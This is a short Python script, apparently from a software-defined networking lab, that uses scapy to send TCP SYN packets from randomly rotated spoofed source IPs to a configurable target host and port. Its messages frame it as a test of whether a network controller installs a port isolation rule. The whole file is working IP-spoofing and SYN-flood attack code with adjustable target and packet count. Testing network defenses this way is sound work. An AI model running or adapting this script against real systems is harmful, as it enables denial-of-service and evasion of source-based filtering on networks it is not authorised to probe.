#!/usr/bin/env python3
"""
attack_spoof_flood.py - Simulates an attacker rotating multiple source IPs from a single host.
"""
import argparse
import random
import time
from scapy.all import IP, TCP, send, conf

conf.verb = 0

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="10.0.0.2")
    parser.add_argument("--port", type=int, default=5000)
    parser.add_argument("--count", type=int, default=20)
    args = parser.parse_args()

    print(f"[EDGE-CASE ATTACK] Simulating IP-Spoofing & Multi-IP cycling towards {args.target}:{args.port}")
    for i in range(args.count):
        # Rotate fake source IPs inside the subnet
        fake_ip = f"10.0.0.{random.randint(10, 200)}"
        sport = random.randint(40000, 60000)
        pkt = IP(src=fake_ip, dst=args.target) / TCP(sport=sport, dport=args.port, flags="S")
        send(pkt)
        print(f"  Sent SYN probe from spoofed source {fake_ip}")
        time.sleep(0.08)

    print("\n[ATTACK DONE] Check Controller console: Port isolation rule should be installed!")

if __name__ == "__main__":
    main()
